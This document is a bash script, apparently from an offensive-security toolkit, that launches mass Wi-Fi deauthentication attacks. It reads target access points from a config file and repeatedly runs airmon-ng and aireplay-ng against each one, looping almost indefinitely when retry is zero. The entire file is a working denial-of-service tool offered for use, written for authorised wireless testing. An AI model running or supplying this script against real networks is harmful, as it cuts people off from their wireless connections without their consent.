#!/bin/bash

#
# This is a massive WLAN deauthentication attacking script
# that takes as input list of APs against which should deauth be launched,
# and then attempts that attack.
#
# Mariusz Banach / mgeeky '18, <mb@binary-offensive.com>
#

if [ $# -ne 1 ]; then
	echo "Usage: ./massDeauth <configFile>"
	exit 1
fi

if [ $EUID -ne 0 ]; then
	echo "[!] This script must be launched as root."
	exit 1
fi

function deauthClients {
	echo -e "\tDeauthing clients in AP: $essid / $bssid, $ch"
	iface=$1
	essid=$2
	bssid=$3
	ch=$4
	deauths=$5

	airmon-ng stop ${iface}mon @> /dev/null
	sleep 2

	echo -e "\t[1] Starting monitor on channel $ch"
	airmon-ng start $iface $ch @> /dev/null
	sleep 3

	if [ -z "$(ls /sys/class/net | paste | grep ${iface}mon)" ]; then
		echo "[!] Could not start monitor interface! Will try again..."
		sleep 3
		return
	fi
	
	echo -e "\t[2] Deauthing $deauths number of times..."
	aireplay-ng --deauth $deauths -e $essid -a $bssid ${iface}mon
}

config=$(cat $1 | grep -vE '^#')
retry=$(echo "$config" | grep retry | cut -d= -f2 | cut -d' ' -f2-)
deauths=$(echo "$config" | grep 'deauths' | grep '=' | awk '{print $3}')
iface=$(echo "$config" | grep iface | cut -d= -f2 | cut -d' ' -f2-)

echo "Using interface: $iface"
echo "Retry count: $retry"
echo "Deauths to be sent: $deauths"

if [ -n "$(ps -eF | grep -v grep | grep airodump)" ]; then
	echo "[!] Airodump-ng is running: will not stick to one channel."
	echo "[!] Please kill airodump-ng first, then proceed further."
	exit 1
fi

if [ $retry -eq 0 ]; then
	retry=99999999
fi

IFS=$'\n'
for i in $(seq 0 $retry); do
	echo -e "\n[$i] Deauthing clients..."
	for line in $(echo "$config" | grep 'target' | cut -d= -f2 | cut -d' ' -f2-); do
		essid=$(echo "$line" | awk '{print $1}')
		bssid=$(echo "$line" | awk '{print $2}')
		ch=$(echo "$line" | awk '{print $3}')

		if [ -z $ch ]; then
			echo "[!] You must specify <channel> for ESSID: $essid"
			exit 1
		fi

		if [ -z $bssid ]; then
			echo "[!] You must specify <bssid> for ESSID: $essid"
			exit 1
		fi
		
		deauthClients $iface $essid $bssid $ch $deauths
	done
done
